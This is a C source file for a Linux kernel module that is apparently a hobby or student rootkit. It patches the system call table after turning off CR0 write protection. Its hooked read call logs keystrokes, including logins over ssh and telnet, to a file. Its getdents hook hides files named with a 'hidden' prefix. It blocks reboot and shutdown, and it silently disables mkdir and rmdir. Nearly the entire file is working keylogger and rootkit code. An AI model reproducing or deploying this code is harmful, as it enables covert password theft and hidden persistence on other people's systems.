#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>

#define enable_reboot 0
#define enable_shutdown 0
#define HIDE_PREFIX "hidden"
#define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX) - 1)
#define LOGFILE "/keylogger.log"

MODULE_LICENSE("GPL");
MODULE_VERSION("0.01");


static char logger_buffer[512];
static char test_buffer[256];
static char special_buffer[2];
int counter = 0;

static unsigned long * sys_call_addr;
asmlinkage int (*old_reboot_sys_call)(int,int,int,void*);
asmlinkage int (*original_read) (unsigned int, char *, size_t);
typedef asmlinkage long (*orig_shutdown_t)(int, int);
typedef asmlinkage long (*orig_rmdir_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_openat_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
orig_getdents_t orig_getdents;
orig_rmdir_t orig_rmdir;
orig_mkdir_t orig_mkdir;
orig_openat_t orig_openat;
orig_shutdown_t orig_shutdown;


struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
	struct linux_dirent* ent;
	long ret = orig_getdents(fd, dirent, count);
	char* dbuf;
    printk("Project: Get Dents called");
	if (ret <= 0) {
        printk("ret was <= 0");
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);
        printk("%s", ent->d_name);
		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)) {   
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			ret -= ent->d_reclen;
		} else {
			boff += ent->d_reclen;
		}
	}
	return ret;
}

asmlinkage int hackers_reboot(int magic1,int magic2,int magic3, void* arg)
{
    if(enable_reboot)
    {
        return old_reboot_sys_call(magic1,magic2,magic3,arg);
    }
    printk("Project: Blocked Reboot Call\n");
    return EPERM;
}


asmlinkage int my_shutdown(int para1, int para2) {
    if(enable_shutdown)
    {
        return orig_shutdown(para1,para2);
    }
    printk("Project: Blocked Shutdown Call\n");
    return EPERM;
}

asmlinkage int my_rmdir(const struct pt_regs *regs)
{
    char __user *filename = (char *)regs->di;
    char dir_name[100] = {0};
    strncpy_from_user(dir_name, filename, 100);
    //orig_rmdir(regs);
    return 0;
}
asmlinkage int my_mkdir(const struct pt_regs *regs)
{
    char __user *filename = (char *)regs->di;
    char dir_name[100] = {0};
    strncpy_from_user(dir_name, filename, 100);
    //orig_mkdir(regs);
    return 0;
}

int write_to_logfile(char *buffer)
{
	struct file *file = NULL;
	mm_segment_t fs;
	int error;

	file = filp_open(LOGFILE, O_CREAT|O_APPEND, 00666);

	if (IS_ERR(file)) {
		error = PTR_ERR(file);
		goto out;
	}
	error = -EACCES;
	// if (!S_ISREG(file->f_dentry->d_inode->i_mode))
	// 	goto out_err;
	error = -EIO;
	if (!file->f_op->write)
		goto out_err;
	error = 0;

	fs = get_fs();
	set_fs(KERNEL_DS);

	file->f_op->write(file, buffer, strlen(buffer), &file->f_pos);

	set_fs(fs);
	filp_close(file,NULL);

out:
	return error;

out_err:
	filp_close(file, NULL);
	printk(KERN_INFO "keylogger: file error.\n");
	goto out;
}

asmlinkage int hacked_read(unsigned int fd, char *buf, size_t count)
{
	int r, i;
	r = original_read(fd, buf, count);

	if (counter)
	{
		if (counter == 2)
		{         // Arrows + Break
			if (buf[0] == 0x44)
			{
				strcat(logger_buffer, "[Left.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x43)
			{
				strcat(logger_buffer, "[Right.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x41)
			{
				strcat(logger_buffer, "[Up.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x42)
			{
				strcat(logger_buffer, "[Down.Arrow]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x50)
			{
				strcat(logger_buffer, "[Break]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x47)
			{
				strcat(logger_buffer, "[Middle.NumLock]");
				counter = 0;
				goto END;
			}

			strncpy(special_buffer, buf, 1);
			counter++;
			goto END;
		}

		if (counter == 3)
		{   // F1-F5
			if (buf[0] == 0x41)
			{
				strcat(logger_buffer, "[F1]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x42)
			{
				strcat(logger_buffer, "[F2]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x43)
			{
				strcat(logger_buffer, "[F3]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x44)
			{
				strcat(logger_buffer, "[F4]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x45)
			{
				strcat(logger_buffer, "[F5]");
				counter = 0;
				goto END;
			}

			if (buf[0] == 0x7E)
			{     // PgUp, PgDown, Ins, ...

				if (special_buffer[0] == 0x35)
					strcat (logger_buffer, "[PgUp]");

				if (special_buffer[0] == 0x36)
					strcat (logger_buffer, "[PgDown]");

				if (special_buffer[0] == 0x33)
					strcat (logger_buffer, "[Delete]");

				if (special_buffer[0] == 0x34)
					strcat (logger_buffer, "[End]");

				if (special_buffer[0] == 0x31)
					strcat (logger_buffer, "[Home]");

				if (special_buffer[0] == 0x32)
					 strcat (logger_buffer, "[Ins]");

				counter = 0;
				goto END;
      			}

			if (special_buffer[0] == 0x31)
			{  // F6-F8
				if (buf[0] == 0x37)
					strcat(logger_buffer, "[F6]");

				if (buf[0] == 0x38)
					strcat(logger_buffer, "[F7]");

				if (buf[0] == 0x39)
					strcat(logger_buffer, "[F8]");

				counter++;
				goto END;
			}


			if (special_buffer[0] == 0x32)
			{ // F6-F12
				if (buf[0] == 0x30)
					strcat(logger_buffer, "[F9]");

				if (buf[0] == 0x31)
					strcat(logger_buffer, "[F10]");

				if (buf[0] == 0x33)
					strcat(logger_buffer, "[F11]");

				if (buf[0] == 0x34)
					strcat(logger_buffer, "[F12]");

				counter++;
				goto END;
			}
		}

		if (counter >= 4) {  //WatchDog
			counter = 0;
			goto END;
		}

		counter ++;
		goto END;
	}

/*
** sys_read() has read one byte from stdin or from elsewhere:
** fd == 0   --> stdin (sh, sshd)
** fd == 3   --> telnetd
** fd == 4   --> /bin/login
*/
	if (r == 1 && (fd == 0 || fd == 3 || fd == 4))
	{
		if (buf[0] == 0x15)
		{        // Ctrl+U -> erase the whole row.
			logger_buffer[0] = '\0';
			goto END;
		}

		if (buf[0] == 0x09)
		{        // Tabulation
			strcat(logger_buffer, "[Tab]");
			goto END;
		}
/*
** User sends BackSpace, we erase the last symbol from the logger_buffer[].
** BackSpace is 0x7F if we're logged locally, or 0x08 if we're logged
** with ssh, telnet ...
*/
		if (buf[0] == 0x7F || buf[0] == 0x08)
		{
			if (logger_buffer[strlen(logger_buffer) - 1] == ']') {  // Oh, the last symbol was "special"?

			for (i = 2; strlen(logger_buffer); i++)
// Trying to find the other "["
				if (logger_buffer[strlen(logger_buffer) - i] == '[')
				{
					logger_buffer[strlen(logger_buffer) - i] = '\0';
					break;
				}
				goto END;
			}
			else
			{
// If it was not "special" replace it with '\0'
	 			logger_buffer[strlen(logger_buffer) - 1] = '\0';
				goto END;
			}
		}

		if (buf[0] == 0x1B)
		{ // user just typed a "special" symbol
			counter++;
			goto END;
		}

		if (buf[0] == '\r' || buf[0] == '\n')
		{
			strncat(logger_buffer, "\n", 1);
			sprintf(test_buffer, "%s", logger_buffer);
			write_to_logfile(test_buffer);
			logger_buffer[0] = '\0';
		}
		else
			strncat(logger_buffer, buf, 1);
 	 }

	END:  return r;
}


inline void my_cr0(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    my_cr0(cr0);
}

static inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    my_cr0(cr0);
}

static int __init start(void)
{
    sys_call_addr = kallsyms_lookup_name("sys_call_table");

    orig_rmdir = (orig_rmdir_t)sys_call_addr[__NR_rmdir];
    orig_shutdown = (orig_shutdown_t)sys_call_addr[__NR_shutdown];
    orig_mkdir=(orig_mkdir_t)sys_call_addr[__NR_mkdir];
    old_reboot_sys_call=sys_call_addr[__NR_reboot];
    original_read = (void *)sys_call_addr[__NR_read];
    orig_getdents = (orig_getdents_t)sys_call_addr[__NR_getdents];
    printk("Project:Module: Loaded \n");
    printk("Project:rmdir @ 0x%lx\n", orig_rmdir);
    printk("Project:rmdir @ 0x%lx\n", orig_mkdir);
    printk("Project:shutdown @ 0x%lx\n", orig_shutdown);
    printk("Project:getdents @ 0x%lx\n", orig_getdents);
    printk("Project:reboot @ 0x%lx\n", old_reboot_sys_call);

    unprotect_memory();
    

    printk("hooked all syscall\n");
    sys_call_addr[__NR_reboot] = (unsigned long) hackers_reboot;
    sys_call_addr[__NR_rmdir] = (unsigned long)my_rmdir;
    sys_call_addr[__NR_mkdir] = (unsigned long)my_mkdir;
    sys_call_addr[__NR_shutdown] = (unsigned long)my_shutdown;
    sys_call_addr[__NR_getdents] = (unsigned long)sys_getdents_new;
    sys_call_addr[__NR_read] = (unsigned long)hacked_read;
    protect_memory();

    return 0;
}

static void __exit end(void)
{
    unprotect_memory();
    
    printk("Project:restoring all syscall\n");
    sys_call_addr[__NR_rmdir] = (unsigned long)orig_rmdir;
    sys_call_addr[__NR_mkdir] = (unsigned long)orig_mkdir;
    sys_call_addr[__NR_shutdown]=(unsigned long)orig_shutdown;
    sys_call_addr[__NR_reboot]=(unsigned long)old_reboot_sys_call;
    sys_call_addr[__NR_getdents]=(unsigned long)orig_getdents;
    sys_call_addr[__NR_read] = (unsigned long)original_read; 
    protect_memory();
    
    printk("Project:Unloaded \n");
}

module_init(start);
module_exit(end);

